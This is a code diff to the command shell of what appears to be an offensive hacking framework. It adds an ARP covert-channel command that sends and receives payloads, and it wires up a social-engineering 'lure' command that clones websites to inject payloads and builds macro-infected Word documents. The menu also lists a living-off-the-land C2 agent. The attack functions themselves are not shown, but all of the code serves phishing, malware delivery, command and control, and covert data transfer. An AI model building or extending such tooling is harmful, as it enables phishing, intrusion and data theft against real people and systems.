@@ -47,6 +47,7 @@ def print_help():
     print("  options           - Show options for the current module")
     print("  run               - Execute the current module")
     print("  lure              - Access the social engineering toolkit")
+    print("  covert            - Use the ARP covert channel")
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
@@ -57,6 +58,12 @@ def print_lure_help():
     print("\n--- Social-Engineering Toolkit ---")
     print("  lure web <url> <payload_url>   - Clone a website and inject a payload")
     print("  lure doc <path> <payload_cmd>  - Create an infectious Word document")
+
+def print_covert_help():
+    """Prints the help menu for the covert command."""
+    print("\n--- ARP Covert Channel ---")
+    print("  covert send <target_ip> <payload> - Send a payload via the ARP covert channel")
+    print("  covert listen [timeout]           - Listen for a payload from the ARP covert channel")
 
 def print_module_options():
     """Prints the options for the currently selected module."""
@@ -72,6 +79,55 @@ def print_module_options():
         print("  RHOST     <ip/label>- The target image file (uses current target if set)")
     else:
         print("This module has no configurable options.")
+
+def run_lure_command(args):
+    """Handles the lure command and its subcommands."""
+    if not args:
+        print_lure_help()
+        return
+
+    lure_command = args[0]
+    lure_args = args[1:]
+
+    if lure_command == "web":
+        if len(lure_args) != 2:
+            print("Usage: lure web <url> <payload_url>")
+            return
+        url, payload_url = lure_args
+        clone_website(url, payload_url)
+    elif lure_command == "doc":
+        if len(lure_args) != 2:
+            print("Usage: lure doc <output_path> <payload_cmd>")
+            return
+        output_path, payload_cmd = lure_args
+        create_macro_doc(output_path, payload_cmd)
+    else:
+        print(f"Unknown lure command: {lure_command}")
+        print_lure_help()
+
+def run_covert_command(args):
+    """Handles the covert command and its subcommands."""
+    if not args:
+        print_covert_help()
+        return
+
+    covert_command = args[0]
+    covert_args = args[1:]
+
+    if covert_command == "send":
+        if len(covert_args) != 2:
+            print("Usage: covert send <target_ip> <payload>")
+            return
+        target_ip, payload_str = covert_args
+        send_arp_covert(target_ip, payload_str.encode())
+    elif covert_command == "listen":
+        timeout = int(covert_args[0]) if covert_args else 60
+        payload = listen_arp_covert(timeout)
+        if payload:
+            print(f"Received payload: {payload.decode(errors='ignore')}")
+    else:
+        print(f"Unknown covert command: {covert_command}")
+        print_covert_help()
 
 def main():
     """The main interactive loop for the shell."""
@@ -162,9 +218,9 @@ def main():
                     encode_image(input_path, payload, output)
                     print("Module execution finished.")
             elif command == "lure":
-                if not args:
-                    print_lure_help()
-                # ... (lure logic)
+                run_lure_command(args)
+            elif command == "covert":
+                run_covert_command(args)
             elif command == "lotl-agent":
                 # ... (lotl-agent logic)
                 pass
